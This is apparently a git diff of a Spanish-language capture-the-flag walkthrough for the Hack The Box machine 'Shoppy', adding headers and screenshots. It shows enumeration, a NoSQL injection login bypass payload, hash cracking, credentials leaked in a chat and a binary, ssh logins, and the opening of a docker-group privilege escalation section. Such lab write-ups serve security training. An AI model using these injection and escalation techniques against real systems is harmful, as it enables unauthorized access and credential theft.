@@ -1,17 +1,18 @@
 # 10.10.11.180 - Shoppy
+![Shoppy](https://user-images.githubusercontent.com/96772264/214269366-d3d5cd68-b466-42c7-9e32-1eaaadffbcef.png)
 -----------------------
+# Part 1: Enumeración
 
 Puertos abiertos 22, 80(http) y 9093:
-
-En cuanto ponemos la IP sale http://shoppy.htb/ pero al no resolver el dominio da error, se soluciona poniendolo
-en el /etc/hosts.
-
+En cuanto ponemos la IP sale http://shoppy.htb/ pero al no resolver el dominio da error, se soluciona poniendolo en el /etc/hosts.
 ```console
 └─$ whatweb http://shoppy.htb    
 HTML5, HTTPServer[nginx/1.23.1], JQuery
 ```
+La web nos presenta una cuenta atras. 
+![shoppy1](https://user-images.githubusercontent.com/96772264/214270005-ac9efc26-1da7-4891-9e7c-a1401cfedc08.PNG)
 
-La web nos presenta una cuenta atras. Si fuzeamos...
+Si fuzeamos...
 ```console
 └─$ wfuzz -t 200 --hc=404 --hl=7 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://shoppy.htb/FUZZ/
 000000039:   200        25 L     62 W       1074 Ch     "login"
@@ -20,7 +21,12 @@ La web nos presenta una cuenta atras. Si fuzeamos...
 El codigo de error 404 es un "cannot /GET", el tipico de nginx.
 Otra cosa de nginx esque funciona con javascript, asi que no fuzzearemos por extensiones php.
 
+-----------------------
+# Part 2: Nosqli
+
 En /login nos encontramos un panel de registro. No tenemos credenciales asi que habra que tirar de inyecciones.
+![shoppy2](https://user-images.githubusercontent.com/96772264/214270044-6f6d1612-a157-447b-b95b-2fce94a43aad.PNG)
+
 ```console
 └─$ curl -s -X POST http://shoppy.htb/login -d "username=test&password=test"
 Found. Redirecting to /login?error=WrongCredentials
@@ -33,9 +39,10 @@ Nginx suele usar nosqli, pero si intentamos una inyeccion se nos queda pillado:
 ```
 Ninguna funciona, otra inyeccion nosqli seria ```admin'||'1'=='1"``` equivalente a ```admin' or 1=1-- -``` del sql
 Con esa ultima entramos al panel de administracion.
+![shoppy3](https://user-images.githubusercontent.com/96772264/214270058-6bd78c48-e0f3-458a-9ec3-1bdbd9d4eeb9.PNG)
 
-Hay un boton de "search for users", como no sabemos si hay mas gente a parte de admin repetimos la query
-```admin'||'1'=='1"```, dandonos un boton de ver reporte:
+Hay un boton de "search for users", como no sabemos si hay mas gente a parte de admin repetimos la query ```admin'||'1'=='1"```, 
+dandonos un boton de ver reporte:
 ```
 {"_id": "62db0e93d6d6a999a66ee67a",
  "username": "admin",
@@ -47,6 +54,9 @@ Hay un boton de "search for users", como no sabemos si hay mas gente a parte de 
 En crackstation nos crakean el 6e... como "remembermethisway"
 Pero no nos sirve para ssh ```sshpass -p "remembermethisway" ssh josh@10.10.11.180```
 
+-----------------------
+# Part 3: Fuzzing y leak de creds
+
 Si hacemos un fuzzing de subdominios con el diccionario clasico ```/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt```
 No ncontramos nada en cambio este:
 ```console
@@ -56,6 +66,7 @@ No ncontramos nada en cambio este:
 
 mattermost.shoppy.htb nos presenta un panel de login. Entramos con las creds josh:rememberthisway
 Es un chat, encontramos el mensaje en el canal "Development":
+![shoppy4](https://user-images.githubusercontent.com/96772264/214270072-336bec7d-9478-483f-969d-3a7487afc0a0.PNG)
 
 ```console
 Ey @jaeger, cuando estaba intentado instalar docket en la maquina empece a aprender C++ e hice un gestor de contraseñas.
@@ -66,6 +77,10 @@ En "deply-machine" nos dan las creds jaeger:Sh0ppyBest@pp!
 ```console
 └─$ sshpass -p 'Sh0ppyBest@pp!' ssh jaeger@10.10.11.180 
 ```
+
+-----------------------
+# Part 4: leak de credenciales en binario
+
 En el directorio /home de deply está ese script de C++ "password-manager.cpp"
 
 Si enumeramos el sistema con mi script, acabamos con el resultado de ```sudo -l```
@@ -118,6 +133,8 @@ Deploy Creds :
 username: deploy
 password: Deploying@pp!
 ```
+-----------------------
+# Part 5: explotando docker
 
 Nuestro usaurio deply forma parte del grupo "docker" (comando ```id```)
 ```console
